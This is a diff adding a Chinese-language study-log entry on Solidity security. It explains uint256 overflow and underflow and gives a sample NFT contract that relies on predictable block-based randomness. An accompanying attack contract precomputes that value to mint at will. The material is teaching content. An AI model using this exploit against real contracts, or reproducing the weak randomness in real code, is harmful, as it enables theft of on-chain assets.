@@ -15,8 +15,67 @@ Beneath bright daylight skies, flowers bloom freely.
 ## Notes
 
 <!-- Content_START -->
+# 2026-07-15
+<!-- DAILY_CHECKIN_2026-07-15_START -->
+2026.7.15
+
+## **整数溢出**
+
+`uint256`无符号256位整数，取值 0 ~2^{256}-1
+
+Solidity0.8.0才引入内置算法溢出自动回滚
+
+**uint256上溢：**
+
+uint256 加法溢出公式：a + b = (a + b) \\bmod 2^{256}
+
+**uint256下溢：**
+
+公式：a - b = (a - b + 2^{256}) \\bmod 2^{256}
+
+## **坏随机数**
+
+以太坊上所有数据均公开透明，链上通常来说无法产生真正的随机数，链上的随机数可以被攻击者事先计算出结果，不安全
+
+带有坏随机数的NFT合约：
+
+```
+ contract BadRandomness is ERC721 {
+     uint256 totalSupply;
+ ​
+     // 构造函数，初始化NFT合集的名称、代号
+     constructor() ERC721("", ""){}
+ ​
+     // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
+     function luckyMint(uint256 luckyNumber) external {
+         uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
+         require(randomNumber == luckyNumber, "Better luck next time!");
+ ​
+         _mint(msg.sender, totalSupply); // mint
+         totalSupply++;
+     }
+ }
+```
+
+攻击合约`Attack.sol`
+
+```
+ contract Attack {
+     function attackMint(BadRandomness nftAddr) external {
+         // 提前计算随机数
+         uint256 luckyNumber = uint256(
+             keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
+         ) % 100;
+         // 利用 luckyNumber 攻击
+         nftAddr.luckyMint(luckyNumber);
+     }
+ }
+```
+<!-- DAILY_CHECKIN_2026-07-15_END -->
+
 # 2026-07-14
 <!-- DAILY_CHECKIN_2026-07-14_START -->
+
 2026.7.14
 
 ## **Solidity类型转换**
@@ -150,6 +209,7 @@ uint
 
 # 2026-07-08
 <!-- DAILY_CHECKIN_2026-07-08_START -->
+
 
 ## **7.8**
 
@@ -293,6 +353,7 @@ pure：既无法读取也无法修改
 
 # 2026-07-07
 <!-- DAILY_CHECKIN_2026-07-07_START -->
+
 
 
 ## **2026.7.7**
